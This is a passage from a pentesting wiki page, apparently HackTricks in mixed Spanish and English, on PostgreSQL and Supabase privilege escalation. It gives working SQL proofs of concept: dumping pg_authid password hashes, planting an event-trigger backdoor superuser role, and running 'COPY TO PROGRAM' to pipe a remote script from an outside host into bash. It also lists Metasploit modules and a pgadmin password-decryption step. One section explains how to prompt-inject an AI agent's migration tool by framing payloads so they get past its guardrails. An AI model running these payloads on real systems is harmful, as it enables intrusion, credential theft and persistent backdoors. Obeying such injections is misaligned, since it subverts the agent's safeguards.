2. Obtain a relative path to the filenode, associated with the `pg_authid` table
3. Download the filenode through the `lo_*` functions
4. Get the datatype, associated with the `pg_authid` table
5. Use the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); set all `rol*` boolean flags to 1 for full permissions.
6. Re-upload the edited filenode via the `lo_*` functions, and overwrite the original file on the disk
7. _(Optionally)_ Clear the in-memory table cache by running an expensive SQL query
8. You should now have the privileges of a full superadmin.

### Prompt-injecting managed migration tooling

AI-heavy SaaS frontends (e.g., Lovable’s Supabase agent) frequently expose LLM “tools” that run migrations as high-privileged service accounts. A practical workflow is:

1. Enumerate who is actually applying migrations:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Prompt-inject the agent into running attacker SQL via the privileged migration tool. Enmarcar payloads como “please verify this migration is denied” evita de forma consistente las guardrails básicas.
3. Una vez que arbitrary DDL se ejecute en ese contexto, cree inmediatamente attacker-owned tables o extensions que otorguen persistencia a su low-privileged account.

> [!TIP]
> Consulte también el general [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) para más técnicas de prompt-injection contra asistentes habilitados con herramientas.

### Volcando metadatos de `pg_authid` mediante migraciones

Las migraciones privilegiadas pueden colocar `pg_catalog.pg_authid` en una tabla legible por el atacante incluso si el acceso directo está bloqueado para su rol normal.

<details>
<summary>Preparando metadatos de pg_authid con una migración privilegiada</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Los usuarios con bajos privilegios ahora pueden leer `public.ai_models` para obtener hashes SCRAM y metadatos de roles para offline cracking o movimiento lateral.

### Event-trigger privesc durante la instalación de la extensión `postgres_fdw`

Las implementaciones gestionadas de Supabase dependen de la extensión `supautils` para envolver `CREATE EXTENSION` con scripts propiedad del proveedor `before-create.sql`/`after-create.sql` ejecutados como verdaderos superusuarios. El script after-create de `postgres_fdw` emite brevemente `ALTER ROLE postgres SUPERUSER`, ejecuta `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`, y luego revierte a `postgres` a `NOSUPERUSER`. Debido a que `ALTER FOREIGN DATA WRAPPER` dispara los event triggers `ddl_command_start`/`ddl_command_end` mientras `current_user` es superuser, los triggers creados por el tenant pueden ejecutar SQL del atacante dentro de esa ventana.

Flujo del exploit:

1. Crea una función de event trigger en PL/pgSQL que compruebe `SELECT usesuper FROM pg_user WHERE usename = current_user` y, cuando sea true, provisione un rol backdoor (p. ej., `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Registra la función en ambos `ddl_command_start` y `ddl_command_end`.
3. Ejecuta `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` seguido de `CREATE EXTENSION postgres_fdw;` para volver a ejecutar el after-create hook de Supabase.
4. Cuando el hook eleva a `postgres`, el trigger se ejecuta, crea el rol SUPERUSER persistente y se lo concede de nuevo a `postgres` para facilitar el acceso con `SET ROLE`.

<details>
<summary>PoC de event trigger para la ventana after-create de postgres_fdw</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

El intento de Supabase de omitir unsafe triggers solo comprueba ownership, así que asegúrate de que el trigger function owner sea tu low-privileged role, pero el payload solo se ejecuta cuando el hook cambia `current_user` a SUPERUSER. Debido a que el trigger se re-ejecuta en futuros DDL, también funciona como un persistence backdoor self-healing siempre que el provider eleve brevemente los tenant roles.

### Convirtiendo un acceso SUPERUSER transitorio en compromiso del host

Después de que `SET ROLE priv_esc;` tenga éxito, vuelve a ejecutar los primitives bloqueados anteriormente:
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` ahora proporcionan acceso arbitrario a archivos y ejecución de comandos como la cuenta OS de la base de datos. Proceda con standard host privilege escalation:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Abusar de un binario SUID mal configurado o de una configuración escribible concede root. Una vez root, recopila credenciales de orquestación (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) to pivot laterally across the provider’s region.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Dentro del archivo _**postgresql.conf**_ puedes habilitar los logs de postgresql cambiando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Luego, **reinicia el servicio**.

### pgadmin

[pgadmin](https://www.pgadmin.org) es una plataforma de administración y desarrollo para PostgreSQL.\
Puedes encontrar **passwords** dentro del archivo _**pgadmin4.db**_\
Puedes descifrar **passwords** usando la función _**decrypt**_ dentro del script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

La autenticación de clientes en PostgreSQL se gestiona mediante un archivo de configuración llamado **pg_hba.conf**. Este archivo contiene una serie de registros, cada uno especificando un tipo de conexión, rango de direcciones IP del cliente (si aplica), nombre de la base de datos, nombre de usuario y el método de autenticación a usar para validar las conexiones. Se utiliza para la autenticación el primer registro que coincida con el tipo de conexión, la dirección del cliente, la base de datos solicitada y el nombre de usuario. No existe un respaldo ni alternativa si la autenticación falla. Si ningún registro coincide, se deniega el acceso.

Los métodos de autenticación basados en contraseña disponibles en pg_hba.conf son **md5**, **crypt** y **password**. Estos métodos difieren en cómo se transmite la contraseña: con hash MD5, cifrada con crypt o en texto claro. Es importante notar que el método crypt no puede usarse con contraseñas que hayan sido cifradas en **pg_authid**.

## Referencias

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
